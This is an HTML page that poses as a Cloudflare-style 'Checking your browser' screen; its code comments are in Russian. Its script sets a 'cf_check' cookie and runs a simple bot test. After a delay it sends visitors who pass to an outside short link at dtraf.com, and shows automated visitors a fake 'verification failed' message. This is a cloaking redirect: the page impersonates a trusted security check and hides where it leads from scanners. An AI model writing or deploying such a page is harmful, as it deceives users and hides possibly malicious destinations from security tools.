<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Checking your browser...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      color: #333;
    }
    .loader {
      margin: 30px auto;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .note {
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <h2>Checking your browser...</h2>
  <div class="loader"></div>
  <div class="note">
    Please wait while we redirect you securely.
    <br>
    If nothing happens, please make sure your browser has JavaScript and Cookies enabled.
  </div>

  <script>
    // Устанавливаем тестовую куку
    document.cookie = "cf_check=ok; path=/; SameSite=Lax";

    // Проверка наличия куки
    function hasCookie(name) {
      return document.cookie.split(';').some(c => c.trim().startsWith(name + '='));
    }

    // Проверка на бота
    function isBot() {
      return navigator.webdriver === true ||
             navigator.plugins.length === 0 ||
             !navigator.language;
    }

    // Основная логика
    setTimeout(function () {
      if (hasCookie("cf_check") && !isBot()) {
        window.location.href = "https://dtraf.com/3rxred";
      } else {
        document.querySelector(".note").innerHTML = "❌ Verification failed. Please refresh the page or try another browser.";
      }
    }, 3000);
  </script>

</body>
</html>
